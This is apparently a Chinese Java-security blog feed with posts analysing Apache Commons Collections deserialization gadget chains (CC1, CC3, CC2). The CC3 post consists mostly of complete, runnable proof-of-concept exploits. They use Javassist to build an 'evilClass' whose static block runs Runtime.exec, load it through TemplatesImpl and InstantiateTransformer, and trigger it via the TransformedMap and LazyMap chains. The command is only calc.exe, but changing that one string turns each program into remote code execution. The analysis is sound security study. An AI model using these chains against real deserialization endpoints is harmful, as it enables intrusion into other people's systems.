<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			AnnotationInvocationHandler.readObject()</span><br><span class="line">				Map(Proxy).entrySet()</span><br><span class="line">					AnnotationInvocationHandler.invoke()</span><br><span class="line">						LazyMap.get()</span><br><span class="line">							ChainedTransformer.transform()</span><br><span class="line">								ConstantTransformer.transform()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Class.getMethod()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.getRuntime()</span><br><span class="line">								InvokerTransformer.transform()</span><br><span class="line">									Method.invoke()</span><br><span class="line">										Runtime.exec()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>CC1这条链里面是有版本限制的，在高版本中对<code>readObject()</code>方法进行了修改，经过测试jdk &lt; 8u71，可以利用成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jdk1.7.0_21 【成功】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(this.type);</span><br><span class="line">        &#125; catch (IllegalArgumentException var9) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = this.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        while(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            if (var7 != null) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + &quot;[&quot; + var8 + &quot;]&quot;)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">jdk1.8.0_171 【失败】</span><br><span class="line">private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        GetField var2 = var1.readFields();</span><br><span class="line">        Class var3 = (Class)var2.get(&quot;type&quot;, (Object)null);</span><br><span class="line">        Map var4 = (Map)var2.get(&quot;memberValues&quot;, (Object)null);</span><br><span class="line">        AnnotationType var5 = null;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            var5 = AnnotationType.getInstance(var3);</span><br><span class="line">        &#125; catch (IllegalArgumentException var13) &#123;</span><br><span class="line">            throw new InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Map var6 = var5.memberTypes();</span><br><span class="line">        LinkedHashMap var7 = new LinkedHashMap();</span><br><span class="line"></span><br><span class="line">        String var10;</span><br><span class="line">        Object var11;</span><br><span class="line">        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">            Entry var9 = (Entry)var8.next();</span><br><span class="line">            var10 = (String)var9.getKey();</span><br><span class="line">            var11 = null;</span><br><span class="line">            Class var12 = (Class)var6.get(var10);</span><br><span class="line">            if (var12 != null) &#123;</span><br><span class="line">                var11 = var9.getValue();</span><br><span class="line">                if (!var12.isInstance(var11) &amp;&amp; !(var11 instanceof ExceptionProxy)) &#123;</span><br><span class="line">                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + &quot;[&quot; + var11 + &quot;]&quot;)).setMember((Method)var5.members().get(var10));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);</span><br><span class="line">        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/nice0e3/p/13798371.html">https://www.cnblogs.com/nice0e3/p/13798371.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections3分析</title>
    <url>/2022/06/04/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections3%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<p>cc3链可以说是cc1和cc2链的结合，下面进行分析。</p>
<span id="more"></span>

<h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p><code>Commons Collections</code> 中提供了一个 <code>org.apache.commons.collections.functors.InstantiateTransformer</code> 类，其实现了 <code>Transformer</code> 接口，并且该类有一个对外公开的构造方法，可以通过传入paramTypes和args对<code>this.iParamTypes</code> 和 <code>this.iArgs</code> 赋值</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604203632873-572689021.png" alt="image-20220604203632075"></p>
<p>在上图还可以看到，存在<code>InstantiateTransformer#transform()</code>方法，该方法可以通过反射实例化一个对象并且返回。</p>
<p>此外，我们发现 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 类的构造方法中存在一处 <code>newTransformer()</code> 调用</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604204348803-761573955.png" alt="image-20220604204347822"></p>
<p>根据前面cc2链的利用思路，如果我们可以通过 <code>InstantiateTransformer.transform()</code> 方法实例化 <code>TrAXFilter</code> 类，在实例化的过程中，如果我们将 <code>TemplatesImpl</code> 类的对象传入 <code>TrAXFilter</code> 的构造方法，那我们就可以实现前面 cc2链中<code>TemplatesImpl.newTransformer()</code> 方法的调用了。</p>
<h3 id="InstantiateTransformer-利用链"><a href="#InstantiateTransformer-利用链" class="headerlink" title="InstantiateTransformer 利用链"></a>InstantiateTransformer 利用链</h3><p>对于 <code>InstantiateTransformer.transform()</code> 方法的调用思路，我们可以参考cc1链。</p>
<p>如下为poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CCOriginal</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        transformerChain.transform(<span class="string">&quot;test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来就是怎么自动触发调用 <code>transformerChain.transform()</code>方法的问题，根据我们前面cc1和cc2学习到的思路，一共有三种方法可以触发：</p>
<ul>
<li>TransformedMap 利用链：<code>TransformedMap.checkSetValue()</code></li>
<li>LazyMap 利用链：<code>LazyMap.get()</code></li>
<li>TransformingComparator 利用链：<code>TransformingComparator.compare()</code>（这种思路是cc4中的）</li>
</ul>
<h3 id="根据-TransformedMap-利用链完成调用"><a href="#根据-TransformedMap-利用链完成调用" class="headerlink" title="根据 TransformedMap 利用链完成调用"></a>根据 TransformedMap 利用链完成调用</h3><p>根据前面的学习，直接给出最终的反序列化 POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_TransformedMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObject);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="根据-LazyMap-利用链完成调用"><a href="#根据-LazyMap-利用链完成调用" class="headerlink" title="根据 LazyMap 利用链完成调用"></a>根据 LazyMap 利用链完成调用</h3><p>直接给出最终的反序列化 POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.sec.cc3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">        <span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line">        <span class="keyword">import</span> javassist.CtClass;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">        <span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line">        <span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line">        <span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line">        <span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line">        <span class="keyword">import</span> java.util.HashMap;</span><br><span class="line">        <span class="keyword">import</span> java.util.Map;</span><br><span class="line">        <span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过 JAVAssist 创建一个名为 evilClass 的类,</span></span><br><span class="line"><span class="comment">         * 在该类中添加一个 static&#123;&#125; 静态块,</span></span><br><span class="line"><span class="comment">         * 并设置父类为 AbstractTranslet</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evilClass&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">/* 将 evilClass 类转换成字节码 */</span></span><br><span class="line">        <span class="type">byte</span>[] evilClassBytes = cc.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] evilByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evilClassBytes&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 获取一个 TemplatesImpl 类的实例对象,</span></span><br><span class="line"><span class="comment">         * 并通过反射将对象中的 _bytecodes 属性设为恶意类 evilClass 的字节码数组,</span></span><br><span class="line"><span class="comment">         * 并保证 _name 属性的值不为 null</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_bytecodes</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">_name</span> <span class="operator">=</span> templatesImpl.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        _bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        _name.set(templatesImpl, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">        _bytecodes.set(templatesImpl, evilByteCodes);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 通过 InstantiateTransformer 实例化 TrAXFilter 类, 并通过 TrAXFilter 类的构造方法实现 TemplatesImpl.newTransformer() 方法的调用 */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templatesImpl&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">confunc</span> <span class="operator">=</span> cls.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        confunc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObject</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(outerMap.getClass().getClassLoader(), outerMap.getClass().getInterfaces(), AIHObject);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">AIHObjectFinal</span> <span class="operator">=</span> (InvocationHandler) confunc.newInstance(Retention.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(b1);</span><br><span class="line">        out.writeObject(AIHObjectFinal);</span><br><span class="line">        out.close();</span><br><span class="line">        b1.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(b1.toString());</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(b1.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(b2);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">        b2.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化时弹出计算器</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202206/1993367-20220604213954505-709958500.png" alt="image-20220604213953177"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA">https://mp.weixin.qq.com/s/GgBHP0ZrA_73ELK_QLJWuA</a></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/13854098.html">https://www.cnblogs.com/nice0e3/p/13854098.html</a></p>
]]></content>
      <categories>
        <category>Java安全</category>
      </categories>
      <tags>
        <tag>cc链</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全之Commons Collections2分析</title>
    <url>/2022/04/28/Java%E5%AE%89%E5%85%A8%E4%B9%8BCommons-Collections2%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<meta name="referrer" content="no-referrer"/>

<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>之前分析了cc1的利用链，但是cc1的利用链是有JDK版本限制的。在JDK8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写，导致高版本中利用链无法使用，这在上文中分析过了。</p>
<span id="more"></span>

<p>cc2链中使用的是<code>commons-collections-4.0</code>版本，利用链如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">		ObjectInputStream.readObject()</span><br><span class="line">			PriorityQueue.readObject()</span><br><span class="line">				...</span><br><span class="line">					TransformingComparator.compare()</span><br><span class="line">						InvokerTransformer.transform()</span><br><span class="line">							Method.invoke()</span><br><span class="line">								Runtime.exec()</span><br></pre></td></tr></table></figure>

<p>这里cc2链使用<code>commons-collections-4.0</code>版本的原因是，在3.2.1版本以下<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口，也就是不可以被序列化的，所以在利用链上就不能使用它去构造。</p>
<p>3.2.1版本</p>
<p><img src="https://img2022.cnblogs.com/blog/1993367/202204/1993367-20220428220627968-329694528.png" alt="image-20220428220626101"></p>
<p>4,0版本</p>
